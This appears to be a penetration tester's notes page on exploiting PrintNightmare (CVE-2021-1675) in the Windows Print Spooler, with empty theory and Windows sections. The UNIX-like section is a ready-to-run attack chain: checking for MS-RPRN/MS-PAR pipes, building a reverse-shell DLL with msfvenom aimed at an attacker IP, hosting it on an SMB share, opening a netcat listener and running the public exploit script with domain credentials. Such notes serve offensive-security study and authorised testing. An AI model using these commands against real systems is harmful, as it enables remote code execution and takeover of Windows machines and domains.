---
Primary_category: "[[PRINT SPOOLER SERVICE]]"
title: "PRINTNIGHTMARE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[PRINT SPOOLER SERVICE]]

#### *Theory*

---

#### *Abuse - UNIX-like*

##### *Checking if the Target's RPC Namedpipes are available*

> ***[Impacket's RPCDump.py](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py)***

> ***Looking for MS-RPRN or MS-PAR pipes enabled***

```bash
rpcdump.py '<DOMAIN>/<USER>:<PASSWD>@<TARGET>' | grep -iP --color -- 'MS-(RPRN|PAR)'
```

##### *Creating a DLL Payload (Reverse Shell)*

> ***[MSFVenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)***

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --format dll --platform windows --arch x64 --out remote.dll
```

##### *Setting up an SMB Server*

> ***[Impacket's SMBServer.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)***

```bash
smbserver.py -smb2support <SHARE> <LOCAL_PATH>
```

##### *Setting up a Netcat Listener for the Rev. Shell*

> ***[Netcat](https://linux.die.net/man/1/nc)***

```bash
nc -nlvp <PORT>
```

##### *Running the Exploit*

> ***[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675)***

> ***From the Attacker*** ⚔️

```bash
python3 CVE-2021-1675.py '<DOMAIN>/<USER>:<PASSWD>@<TARGET>' '\\<ATTACKER>\<SHARE>\remote.dll'
```

---

#### *Abuse - Windows*